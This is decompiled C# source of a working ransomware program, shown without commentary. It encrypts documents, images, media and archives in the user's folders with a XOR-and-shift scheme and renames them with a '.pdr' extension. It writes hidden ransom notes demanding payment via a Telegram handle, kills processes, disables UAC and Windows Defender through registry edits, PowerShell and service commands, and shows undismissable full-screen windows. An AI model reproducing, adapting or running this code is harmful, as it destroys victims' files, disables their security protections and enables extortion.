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[...string is too long...]";
				bool flag = text == "пїЅпїЅпїЅпїЅпїЅпїЅ_пїЅпїЅпїЅпїЅ_пїЅпїЅпїЅпїЅ_BASE64_пїЅпїЅпїЅпїЅпїЅ";
				if (!flag)
				{
					string text2 = Path.Combine(Path.GetTempPath(), "wallpaper_qyabab.jpg");
					byte[] array = Convert.FromBase64String(text);
					File.WriteAllBytes(text2, array);
					main.SystemParametersInfo(20, 0, text2, 3);
					using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true))
					{
						bool flag2 = registryKey != null;
						if (flag2)
						{
							registryKey.SetValue("Wallpaper", text2);
							registryKey.SetValue("WallpaperStyle", "10");
							registryKey.SetValue("TileWallpaper", "0");
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000085 RID: 133
		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

		// Token: 0x06000086 RID: 134 RVA: 0x000086B4 File Offset: 0x000068B4
		private void Stage3_ShowGUI()
		{
			bool guiShown = this._guiShown;
			if (!guiShown)
			{
				this._guiShown = true;
				this.SetWallpaperFromBase64();
				this.DisableUAC();
				string text = Class1.Class0_0.Info.OSFullName.Trim().ToLower();
				bool flag = !text.Contains("10") && !text.Contains("11");
				if (flag)
				{
					this.string_3 += "/S *";
				}
				int num = 0;
				foreach (Screen screen in Screen.AllScreens)
				{
					num++;
					bool flag2 = num == 1;
					if (flag2)
					{
						gui gui = new gui();
						gui.Top = screen.WorkingArea.Top;
						gui.Left = screen.WorkingArea.Left;
						gui.Show();
						gui.Activate();
					}
					else
					{
						GForm0 gform = new GForm0();
						gform.Top = screen.WorkingArea.Top;
						gform.Left = screen.WorkingArea.Left;
						gform.Show();
						gform.Activate();
					}
				}
			}
		}

		// Token: 0x06000087 RID: 135 RVA: 0x00008808 File Offset: 0x00006A08
		private void KillTargetProcesses()
		{
			foreach (string text in this.string_1)
			{
				try
				{
					foreach (Process process in Process.GetProcessesByName(text))
					{
						try
						{
							process.Kill();
							process.WaitForExit(1000);
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000088 RID: 136 RVA: 0x00008894 File Offset: 0x00006A94
		public void Method_UnpinAll()
		{
			try
			{
				string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar");
				bool flag = Directory.Exists(text);
				if (flag)
				{
					foreach (string text2 in Directory.GetFiles(text, "*.lnk"))
					{
						try
						{
							File.Delete(text2);
						}
						catch
						{
						}
					}
					foreach (string text3 in Directory.GetDirectories(text))
					{
						try
						{
							Directory.Delete(text3, true);
						}
						catch
						{
						}
					}
				}
				try
				{
					using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Taskband", true))
					{
						bool flag2 = registryKey != null;
						if (flag2)
						{
							try
							{
								registryKey.DeleteValue("Favorites");
							}
							catch
							{
							}
							try
							{
								registryKey.DeleteValue("FavoritesResolve");
							}
							catch
							{
							}
							try
							{
								registryKey.DeleteSubKeyTree("Favorites");
							}
							catch
							{
							}
						}
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000089 RID: 137 RVA: 0x00008A74 File Offset: 0x00006C74
		private void CreateRansomNotes()
		{
			string text = "!!! ATTENTION !!! Your files are encrypted. Contact Telegram @cyberartsiv. Payment: 500 TG STARS.";
			try
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
				File.WriteAllText(Path.Combine(folderPath, "!!!READ_ME!!!.txt"), text);
				File.WriteAllText(Path.Combine(folderPath2, "!!!READ_ME!!!.txt"), text);
				foreach (string text2 in this.string_0)
				{
					bool flag = Directory.Exists(text2 + ":\\");
					if (flag)
					{
						try
						{
							File.WriteAllText(Path.Combine(text2 + ":\\", "!!!READ_ME!!!.txt"), text);
						}
						catch
						{
						}
					}
				}
				string text3 = "attrib +h +s +r \"%userprofile%\\Desktop\\!!!READ_ME!!!.txt\" & attrib +h +s +r \"%userprofile%\\Documents\\!!!READ_ME!!!.txt\"";
				Interaction.Shell("cmd.exe /c " + text3, AppWinStyle.Hide, false, -1);
			}
			catch
			{
			}
		}

		// Token: 0x0600008A RID: 138 RVA: 0x000021BC File Offset: 0x000003BC
		private void GForm1_FormClosing(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
		}

		// Token: 0x0600008B RID: 139 RVA: 0x00008B5C File Offset: 0x00006D5C
		public void Method_EncryptSystem()
		{
			try
			{
				string[] array = new string[]
				{
					Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
					Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads",
					Environment.GetFolderPath(Environment.SpecialFolder.Personal),
					Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
					Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Music"),
					Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Videos")
				};
				foreach (string text in array)
				{
					bool stopEncryption = main._stopEncryption;
					if (stopEncryption)
					{
						break;
					}
					bool flag = Directory.Exists(text);
					if (flag)
					{
						this.CrawlAndEncrypt(text);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600008C RID: 140 RVA: 0x00008C1C File Offset: 0x00006E1C
		private void CrawlAndEncrypt(string directory)
		{
			bool stopEncryption = main._stopEncryption;
			if (!stopEncryption)
			{
				try
				{
					string text = directory.ToLower();
					bool flag = text.Contains("\\windows") || text.Contains("\\program files") || text.Contains("\\appdata");
					if (!flag)
					{
						string[] files;
						try
						{
							files = Directory.GetFiles(directory);
						}
						catch
						{
							return;
						}
						string[] array = files;
						int i = 0;
						while (i < array.Length)
						{
							string text2 = array[i];
							bool stopEncryption2 = main._stopEncryption;
							if (stopEncryption2)
							{
								return;
							}
							try
							{
								string fileName = Path.GetFileName(text2);
								bool flag2 = fileName.ToLower() == "lc.exe";
								if (!flag2)
								{
									bool flag3 = fileName.EndsWith(this.ransomExtension + ".tmp");
									if (flag3)
									{
										string text3 = text2.Substring(0, text2.Length - (this.ransomExtension + ".tmp").Length);
										bool flag4 = !File.Exists(text3);
										if (flag4)
										{
											string text4 = text2.Substring(0, text2.Length - ".tmp".Length);
											bool flag5 = File.Exists(text4);
											if (flag5)
											{
												File.Delete(text4);
											}
											File.Move(text2, text4);
										}
										else
										{
											try
											{
												File.Delete(text2);
											}
											catch
											{
											}
										}
									}
									else
									{
										bool flag6 = !this.IsValidFileName(fileName);
										if (!flag6)
										{
											bool flag7 = fileName.EndsWith(this.ransomExtension);
											if (!flag7)
											{
												string text5 = Path.GetExtension(text2).ToLower();
												bool flag8 = Array.IndexOf<string>(this.targetExtensions, text5) >= 0;
												if (flag8)
												{
													this.EncryptFile(text2);
												}
											}
										}
									}
								}
							}
							catch
							{
							}
							IL_01B6:
							i++;
							continue;
							goto IL_01B6;
						}
						string[] directories;
						try
						{
							directories = Directory.GetDirectories(directory);
						}
						catch
						{
							return;
						}
						foreach (string text6 in directories)
						{
							bool stopEncryption3 = main._stopEncryption;
							if (stopEncryption3)
							{
								break;
							}
							try
							{
								this.CrawlAndEncrypt(text6);
							}
							catch
							{
							}
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600008D RID: 141 RVA: 0x00008EDC File Offset: 0x000070DC
		private bool IsValidFileName(string fileName)
		{
			bool flag = string.IsNullOrEmpty(fileName);
			bool flag2;
			if (flag)
			{
				flag2 = false;
			}
			else
			{
				foreach (char c in fileName)
				{
					bool flag3 = c < ' ' && c != '\t' && c != '\n' && c != '\r';
					if (flag3)
					{
						return false;
					}
					bool flag4 = c == '\ufffd';
					if (flag4)
					{
						return false;
					}
				}
				flag2 = true;
			}
			return flag2;
		}

		// Token: 0x0600008E RID: 142 RVA: 0x00008F58 File Offset: 0x00007158
		private void EncryptFile(string filePath)
		{
			bool stopEncryption = main._stopEncryption;
			if (!stopEncryption)
			{
				bool flag = filePath.EndsWith(this.ransomExtension) || filePath.EndsWith(".tmp");
				if (!flag)
				{
					string text = filePath + this.ransomExtension;
					string text2 = text + ".tmp";
					try
					{
						FileInfo fileInfo = new FileInfo(filePath);
						long length = fileInfo.Length;
						using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
						{
							using (FileStream fileStream2 = new FileStream(text2, FileMode.Create, FileAccess.Write, FileShare.None))
							{
								byte[] array = new byte[8192];
								long num = 0L;
								int num2;
								while ((num2 = fileStream.Read(array, 0, array.Length)) > 0)
								{
									bool stopEncryption2 = main._stopEncryption;
									if (stopEncryption2)
									{
										fileStream2.Close();
										try
										{
											bool flag2 = File.Exists(text2);
											if (flag2)
											{
												File.Delete(text2);
											}
										}
										catch
										{
										}
										return;
									}
									for (int i = 0; i < num2; i++)
									{
										byte[] array2 = array;
										int num3 = i;
										checked
										{
											array2[num3] ^= this.xorKey[(int)((IntPtr)(unchecked((num + (long)i) % (long)this.xorKey.Length)))];
										}
										array[i] = (byte)((int)(array[i] + 105) % 256);
									}
									fileStream2.Write(array, 0, num2);
									num += (long)num2;
								}
								fileStream2.Flush(true);
							}
						}
						bool flag3 = new FileInfo(text2).Length == length;
						if (flag3)
						{
							bool flag4 = File.Exists(text);
							if (flag4)
							{
								File.Delete(text);
							}
							File.Move(text2, text);
							bool flag5 = File.Exists(filePath);
							if (flag5)
							{
								File.Delete(filePath);
							}
						}
						else
						{
							bool flag6 = File.Exists(text2);
							if (flag6)
							{
								File.Delete(text2);
							}
						}
					}
					catch
					{
						try
						{
							bool flag7 = File.Exists(text2);
							if (flag7)
							{
								File.Delete(text2);
							}
						}
						catch
						{
						}
					}
				}
			}
		}

		// Token: 0x0600008F RID: 143 RVA: 0x000091D4 File Offset: 0x000073D4
		private void DisableUAC()
		{
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
				{
					bool flag = registryKey != null;
					if (flag)
					{
						registryKey.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
						registryKey.SetValue("ConsentPromptBehaviorAdmin", 0, RegistryValueKind.DWord);
						registryKey.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
						registryKey.SetValue("ConsentPromptBehaviorUser", 0, RegistryValueKind.DWord);
						registryKey.Close();
					}
				}
			}
			catch
			{
			}
			try
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					UseShellExecute = false
				});
			}
			catch
			{
			}
		}

		// Token: 0x06000090 RID: 144 RVA: 0x0000662C File Offset: 0x0000482C
		private void RunCmd(string args)
		{
			try
			{
				Process process = Process.Start(new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/c " + args,
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				});
				if (process != null)
				{
					process.WaitForExit(10000);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000091 RID: 145 RVA: 0x0000669C File Offset: 0x0000489C
		private void RunPowerShell(string command)
		{
			try
			{
				Process process = Process.Start(new ProcessStartInfo
				{
					FileName = "powershell.exe",
					Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"" + command.Replace("\"", "`\"") + "\"",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				});
				if (process != null)
				{
					process.WaitForExit(15000);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000092 RID: 146 RVA: 0x000092D8 File Offset: 0x000074D8
		private void DisableDefender()
		{
			try
			{
				this.RunPowerShell("Set-MpPreference -DisableRealtimeMonitoring $true");
				this.RunPowerShell("Set-MpPreference -DisableBehaviorMonitoring $true");
				this.RunPowerShell("Set-MpPreference -DisableBlockAtFirstSeen $true");
				this.RunPowerShell("Set-MpPreference -DisableIOAVProtection $true");
				this.RunPowerShell("Set-MpPreference -DisablePrivacyMode $true");
				this.RunPowerShell("Set-MpPreference -SignatureDisableUpdate $true");
				Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", 1, RegistryValueKind.DWord);
				Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
				string[] array = new string[] { "WinDefend", "SecurityHealthService", "WdFilter", "WdNisDrv", "WdNisSvc", "WdBoot", "MpsSvc" };
				foreach (string text in array)
				{
					this.RunCmd("sc stop " + text);
					this.RunCmd("sc config " + text + " start=disabled");
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000093 RID: 147 RVA: 0x000093F4 File Offset: 0x000075F4
		private void PerformFinalCleanup()
		{
			try
			{
				try
				{
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
					if (registryKey != null)
					{
						registryKey.SetValue("Shell", "explorer.exe");
					}
				}
				catch
				{
				}
				try
				{
					RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
					if (registryKey2 != null)
					{
						registryKey2.SetValue("Userinit", "C:\\Windows\\system32\\userinit.exe,");
					}
				}
				catch
				{
				}
				try
				{
					Process.Start(new ProcessStartInfo("cmd.exe", "/c schtasks /delete /tn \"\\Microsoft\\Windows\\WindowsUpdate\\svchost\" /f")
					{
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true
					});
				}
				catch
				{
				}
				try
				{
					Process.Start(new ProcessStartInfo("cmd.exe", "/c schtasks /delete /tn \"WindowsDefenderScan\" /f")
					{
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true
					});
				}
				catch
				{
				}
				string[] array = new string[] { "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" };
				foreach (string text in array)
				{
					try
					{
						RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey(text, true);
						bool flag = registryKey3 != null;
						if (flag)
						{
							registryKey3.DeleteValue("DisableTaskMgr", false);
							registryKey3.DeleteValue("DisableCMD", false);
							registryKey3.DeleteValue("DisableRegistryTools", false);
							registryKey3.DeleteValue("NoRun", false);
							registryKey3.DeleteValue("NoClose", false);
						}
					}
					catch
					{
					}
					try
					{
						RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey(text, true);
						bool flag2 = registryKey4 != null;
						if (flag2)
						{
							registryKey4.DeleteValue("DisableTaskMgr", false);
							registryKey4.DeleteValue("DisableCMD", false);
							registryKey4.DeleteValue("DisableRegistryTools", false);
							registryKey4.DeleteValue("NoRun", false);
							registryKey4.DeleteValue("NoClose", false);
						}
					}
					catch
					{
					}
				}
				string[] array3 = new string[]
				{
					"cmd.exe", "powershell.exe", "pwsh.exe", "taskmgr.exe", "regedit.exe", "msconfig.exe", "mmc.exe", "control.exe", "eventvwr.exe", "perfmon.exe",
					"resmon.exe"
				};
				foreach (string text2 in array3)
				{
					try
					{
						RegistryKey registryKey5 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", true);
						if (registryKey5 != null)
						{
							registryKey5.DeleteSubKey(text2, false);
						}
					}
					catch
					{
					}
				}
				try
				{
					RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\WindowsPowerShell", true);
					if (registryKey6 != null)
					{
						registryKey6.SetValue("EnableScripts", 1);
					}
				}
				catch
				{
				}
				try
				{
					RegistryKey registryKey7 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\WindowsPowerShell", true);
					if (registryKey7 != null)
					{
						registryKey7.DeleteValue("DisableCommandLine", false);
					}
				}
				catch
				{
				}
				try
				{
					RegistryKey registryKey8 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\USBSTOR", true);
					if (registryKey8 != null)
					{
						registryKey8.SetValue("Start", 3);
					}
				}
				catch
				{
				}
				try
				{
					RegistryKey registryKey9 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\cdrom", true);
					if (registryKey9 != null)
					{
						registryKey9.SetValue("Start", 1);
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400004F RID: 79
		public string[] string_0;

		// Token: 0x04000050 RID: 80
		public string[] string_1;

		// Token: 0x04000051 RID: 81
		public string[] string_2;

		// Token: 0x04000052 RID: 82
		public string string_3;

		// Token: 0x04000053 RID: 83
		public string string_4;

		// Token: 0x04000054 RID: 84
		public string string_5;

		// Token: 0x04000055 RID: 85
		public string string_6;

		// Token: 0x04000056 RID: 86
		public string string_8;

		// Token: 0x04000057 RID: 87
		public object object_0;

		// Token: 0x04000058 RID: 88
		private string[] targetExtensions = new string[]
		{
			".exe", ".lnk", ".dll", ".doc", ".docx", ".xls", ".xlsx", ".jpg", ".png", ".pdf",
			".txt", ".mp4", ".zip", ".rar", ".ppt", ".pptx", ".mp3", ".wav"
		};

		// Token: 0x04000059 RID: 89
		private string ransomExtension = ".pdr";

		// Token: 0x0400005A RID: 90
		private byte[] xorKey = new byte[] { 19, 55, 222, 173 };

		// Token: 0x0400005B RID: 91
		private int _payloadExecuted = 0;

		// Token: 0x0400005C RID: 92
		private bool _guiShown = false;

		// Token: 0x0400005D RID: 93
		public static bool _stopEncryption;
	}
}
